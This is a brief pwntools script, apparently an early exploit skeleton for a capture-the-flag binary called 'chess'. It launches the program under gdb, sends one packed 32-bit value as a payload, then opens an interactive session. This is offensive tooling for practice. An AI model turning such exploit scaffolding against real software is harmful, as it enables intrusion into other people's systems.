from pwn import * 

elf = ELF('./chess')
context.binary = elf
context.log_level = 'DEBUG'
libc = elf.libc

p = process()
gdb.attach(p)
p.recv()
payload = p32(0xFFFF)
p.sendline(payload)
p.interactive()